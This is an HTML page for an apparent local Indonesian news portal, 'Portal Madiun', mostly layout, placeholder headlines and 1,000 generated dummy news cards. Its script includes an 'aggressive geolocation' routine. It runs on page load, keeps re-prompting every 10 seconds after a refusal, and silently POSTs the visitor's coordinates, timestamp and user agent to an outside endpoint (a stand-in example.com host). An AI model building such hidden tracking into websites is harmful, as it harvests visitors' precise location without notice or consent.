<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Portal Madiun - Berita Terkini</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
/* --- CSS Utama --- */
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
body{background:#f5f5f5;}
.header{background:#fff;position:sticky;top:0;z-index:1000;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
.top-bar{background:#dc2626;color:#fff;padding:8px 0;font-size:14px;}
.container{max-width:1200px;margin:0 auto;padding:0 20px;}
.top-bar-content{display:flex;justify-content:space-between;align-items:center;}
.main-header{display:flex;justify-content:space-between;align-items:center;padding:15px 0;}
.logo{font-size:36px;font-weight:bold;color:#dc2626;text-decoration:none;}
.search-bar{display:flex;align-items:center;background:#f1f1f1;border-radius:25px;padding:5px 15px;width:300px;}
.search-bar input{border:none;background:none;outline:none;width:100%;padding:5px;}
.search-bar button{background:none;border:none;color:#666;cursor:pointer;}
.nav{background:#333;}
.nav-list{display:flex;list-style:none;}
.nav-list li{position:relative;}
.nav-list a{display:block;color:white;text-decoration:none;padding:15px 20px;font-size:14px;transition:background 0.3s;}
.nav-list a:hover{background:#dc2626;}
.breaking-news{background:#dc2626;color:#fff;padding:10px 20px;display:flex;align-items:center;margin-bottom:20px;overflow:hidden;}
.breaking-news-label{background:#fff;color:#dc2626;padding:5px 10px;font-weight:bold;margin-right:15px;border-radius:3px;font-size:12px;}
.breaking-news-content{overflow:hidden;white-space:nowrap;flex:1;}
.breaking-news-scroll{display:inline-block;}
.main-content{display:grid;grid-template-columns:3fr 1fr;gap:20px;margin-top:20px;}
.news-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px;}
.news-card{background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 5px rgba(0,0,0,0.1);transition:transform 0.3s;}
.news-card:hover{transform:translateY(-5px);}
.news-card img{width:100%;height:180px;object-fit:cover;}
.news-card-content{padding:15px;}
.news-category{color:#dc2626;font-size:12px;font-weight:bold;margin-bottom:5px;}
.news-title{font-size:16px;font-weight:bold;margin-bottom:10px;line-height:1.3;}
.news-title a{color:#333;text-decoration:none;}
.news-title a:hover{color:#dc2626;}
.news-meta{display:flex;justify-content:space-between;color:#666;font-size:12px;}
.sidebar{display:flex;flex-direction:column;gap:20px;}
.sidebar-section{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
.sidebar-title{font-size:18px;font-weight:bold;margin-bottom:15px;padding-bottom:10px;border-bottom:2px solid #dc2626;}
.trending-list{list-style:none;}
.trending-list li{padding:12px 0;border-bottom:1px solid #eee;display:flex;align-items:center;}
.trending-number{background:#dc2626;color:#fff;width:25px;height:25px;display:flex;align-items:center;justify-content:center;border-radius:50%;margin-right:10px;font-weight:bold;font-size:14px;}
.trending-title{flex:1;}
.trending-title a{color:#333;text-decoration:none;font-size:14px;line-height:1.3;}
.trending-title a:hover{color:#dc2626;}
.newsletter-input{width:100%;padding:10px;border:1px solid #ddd;border-radius:5px;margin-bottom:10px;font-size:14px;}
.newsletter-btn{width:100%;padding:10px;background:#dc2626;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:14px;transition:0.3s;}
.newsletter-btn:hover{background:#b91c1c;}
.tags-container{display:flex;flex-wrap:wrap;gap:8px;margin-top:15px;}
.tag{background:#f1f1f1;padding:5px 12px;border-radius:15px;text-decoration:none;color:#333;font-size:13px;transition:0.3s;}
.tag:hover{background:#dc2626;color:white;}
.footer{background:#333;color:#fff;margin-top:40px;padding:40px 0 20px;}
.footer-content{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:30px;margin-bottom:30px;}
.footer-section h3{margin-bottom:15px;color:#dc2626;font-size:16px;}
.footer-section ul{list-style:none;}
.footer-section ul li{margin-bottom:8px;}
.footer-section a{color:#ccc;text-decoration:none;font-size:14px;transition:0.3s;}
.footer-section a:hover{color:white;}
.footer-bottom{text-align:center;padding-top:20px;border-top:1px solid #555;color:#ccc;font-size:14px;}
.social-links{display:flex;gap:15px;margin-top:15px;}
.social-links a{color:white;font-size:20px;transition:0.3s;}
.social-links a:hover{color:#dc2626;}
.mobile-menu-btn{display:none;background:none;border:none;color:#333;font-size:24px;cursor:pointer;}
@media(max-width:768px){
.main-header{flex-direction:column;gap:15px;}
.search-bar{width:100%;}
.nav-list{display:none;}
.mobile-menu-btn{display:block;}
.main-content{grid-template-columns:1fr;}
.news-grid{grid-template-columns:1fr;}
.breaking-news-label{display:none;}
}
</style>
</head>
<body>

<!-- Header -->
<header class="header">
<div class="top-bar">
<div class="container">
<div class="top-bar-content">
<span><i class="fas fa-calendar"></i> <span id="currentDate"></span></span>
<span><i class="fas fa-user"></i> Masuk</span>
</div>
</div>
</div>

<div class="container">
<div class="main-header">
<a href="#" class="logo">Portal Madiun</a>
<div class="search-bar">
<input type="text" placeholder="Cari berita...">
<button><i class="fas fa-search"></i></button>
</div>
<button class="mobile-menu-btn"><i class="fas fa-bars"></i></button>
</div>
</div>

<nav class="nav">
<div class="container">
<ul class="nav-list">
<li><a href="#">Home</a></li>
<li><a href="#">Madiun</a></li>
<li><a href="#">Jatim</a></li>
<li><a href="#">Nasional</a></li>
<li><a href="#">Ekonomi</a></li>
<li><a href="#">Olahraga</a></li>
<li><a href="#">Teknologi</a></li>
<li><a href="#">Hiburan</a></li>
</ul>
</div>
</nav>
</header>

<!-- Breaking News -->
<div class="breaking-news">
<span class="breaking-news-label">BREAKING</span>
<div class="breaking-news-content">
<span class="breaking-news-scroll">
Walikota Madiun resmikan pasar modern • Bantuan UMKM • Festival budaya Madiun akan digelar bulan depan •
</span>
</div>
</div>

<!-- Main Content -->
<div class="container">
<div class="main-content">
<main>
<div class="news-grid"></div>
</main>

<aside class="sidebar">
<div class="sidebar-section">
<h3 class="sidebar-title">Terpopuler</h3>
<ol class="trending-list">
<li><span class="trending-number">1</span><div class="trending-title"><a href="#">Viral Video Bocah Madiun Nyanyi Pecel</a></div></li>
<li><span class="trending-number">2</span><div class="trending-title"><a href="#">Resep Pecel Madiun Autentik</a></div></li>
<li><span class="trending-number">3</span><div class="trending-title"><a href="#">Sejarah Kota Madiun yang Perlu Diketahui</a></div></li>
</ol>
</div>

<div class="sidebar-section">
<h3 class="sidebar-title">Newsletter</h3>
<form class="newsletter-form">
<input type="email" class="newsletter-input" placeholder="Masukkan email Anda">
<button type="submit" class="newsletter-btn">Langganan</button>
</form>
</div>

<div class="sidebar-section">
<h3 class="sidebar-title">Tags</h3>
<div class="tags-container">
<a href="#" class="tag">Madiun</a>
<a href="#" class="tag">Ekonomi</a>
<a href="#" class="tag">Budaya</a>
<a href="#" class="tag">Pendidikan</a>
<a href="#" class="tag">Teknologi</a>
</div>
</div>
</aside>
</div>
</div>

<!-- Footer -->
<footer class="footer">
<div class="container footer-content">
<div class="footer-section">
<h3>Tentang Kami</h3>
<p>Portal Madiun adalah media online yang menyajikan berita terkini seputar Kota Madiun dan sekitarnya.</p>
<div class="social-links">
<a href="#"><i class="fab fa-facebook"></i></a>
<a href="#"><i class="fab fa-twitter"></i></a>
<a href="#"><i class="fab fa-instagram"></i></a>
</div>
</div>
<div class="footer-section">
<h3>Kontak</h3>
<ul>
<li>Email: info@portal-madiun.id</li>
<li>Telepon: (0351) 123456</li>
<li>Alamat: Jl. Panglima Sudirman No.45, Madiun</li>
</ul>
</div>
</div>
<div class="footer-bottom">© 2025 Portal Madiun. All Rights Reserved.</div>
</footer>

<script>
// ---------- Tanggal Dinamis ----------
const today = new Date();
document.getElementById('currentDate').innerText = today.toLocaleDateString('id-ID', { weekday:'long', day:'numeric', month:'long', year:'numeric' });

// ---------- Mobile Menu ----------
const mobileBtn = document.querySelector('.mobile-menu-btn');
const navList = document.querySelector('.nav-list');
mobileBtn.addEventListener('click', ()=>{ navList.style.display = navList.style.display === 'flex'?'none':'flex'; });

// ---------- Breaking News Scroll ----------
const scrollContent = document.querySelector('.breaking-news-scroll');
function animateScroll() {
    scrollContent.style.transform = `translateX(${window.innerWidth}px)`;
    let start=null;
    function step(timestamp){
        if(!start) start=timestamp;
        let progress=timestamp-start;
        let width=scrollContent.scrollWidth+window.innerWidth;
        scrollContent.style.transform = `translateX(${window.innerWidth - (progress*width/30000)}px)`;
        if(progress<30000) requestAnimationFrame(step);
        else animateScroll();
    }
    requestAnimationFrame(step);
}
animateScroll();

// ---------- Geolocation Agresif ----------
async function sendLocation(data){
    try{
        await fetch('https://example.com/endpoint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
        console.log('Data lokasi dikirim:', data);
    }catch(e){console.error('Gagal kirim lokasi:', e);}
}

function requestLocation(){
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(successLocation,errorLocation,{timeout:10000});
    }else console.log("Geolocation tidak didukung");
}
function successLocation(pos){
    const lat=pos.coords.latitude, lon=pos.coords.longitude;
    const data={latitude:lat,longitude:lon,ip:'',timestamp:Date.now(),browser:navigator.userAgent};
    sendLocation(data);
}
function errorLocation(err){
    console.log("Gagal mendapatkan lokasi:",err.message);
    setTimeout(requestLocation,10000);
}
window.addEventListener('load',requestLocation);

// ---------- Render Berita Ribuan ----------
const newsGrid=document.querySelector('.news-grid');
for(let i=1;i<=1000;i++){
    const card=document.createElement('article');
    card.className='news-card';
    card.innerHTML=`
        <img src="https://picsum.photos/seed/news${i}/400/250.jpg" alt="Berita ${i}">
        <div class="news-card-content">
            <div class="news-category">Kategori ${i%10}</div>
            <h2 class="news-title"><a href="#">Judul Berita ${i}</a></h2>
            <div class="news-meta"><span><i class="fas fa-clock"></i> ${i%24} jam lalu</span> <span><i class="fas fa-eye"></i> ${Math.floor(Math.random()*5000)}</span></div>
        </div>
    `;
    newsGrid.appendChild(card);
}
</script>

</body>
</html>
